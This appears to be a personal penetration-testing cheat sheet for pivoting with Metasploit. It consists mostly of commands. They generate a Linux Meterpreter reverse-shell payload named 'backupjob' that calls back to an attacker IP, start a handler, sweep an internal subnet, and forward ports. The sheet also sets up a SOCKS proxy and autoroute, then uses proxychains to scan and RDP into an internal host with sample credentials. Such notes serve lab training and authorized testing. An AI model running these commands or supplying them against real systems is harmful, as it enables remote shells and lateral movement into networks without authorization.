- [ ] Meterpreter Local Port Forwarding
- [ ] Meterpreter Remote Port Forwarding
- [ ] Meterpreter - Tunneling trough SOCKS

Meterpreter Local Port Forwarding!!!
```sh
# payload generation
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.10.16.48 -f elf -o backupjob LPORT=8080

# meterpreter shell
msfconsole -q
use exploit/multi/handler
set payload linux/x64/meterpreter/reverse_tcp
set lhost 0.0.0.0
set lport 8000
run
# post exploitation | ping_sweep
run post/multi/gather/ping_sweep RHOSTS=172.16.6.0/24
# Local Port Forwarding | Creating Local TCP Relay
help portfwd
portfwd add -l 3300 -p 3389 -r 172.16.5.19
portfwd add -l 3306 -p 3306 -r 172.16.5.19
```
Meterpreter Remote - Reverse Port Forwarding!!!
```sh
portfwd add -R -l 8081 -p 1234 -L 10.10.14.18
```
Meterpreter - Tunneling trough SOCKS!!!
```sh
use auxiliary/server/socks_proxy
set SRVPORT 9050
set SRVHOST 0.0.0.0
set version 4a
run
jobs
# /etc/proxychains4.conf
echo 'socks4 	127.0.0.1 9050' >> /etc/proxychains4.conf
# Creating Routes with AutoRoute
use post/multi/manage/autoroute
set SESSION 1
set SUBNET 172.16.5.0
run
# run autoroute from meterpreter sesion
run autoroute -s 172.16.5.0/23
# listing active auto routes
run autoroute -p
# Testing Proxy & Routing Functionality
proxychains nmap 172.16.5.19 -p3389 -sT -v -Pn
proxychains xfreerdp /v:172.16.5.19 /u:victor /p:pass@123
```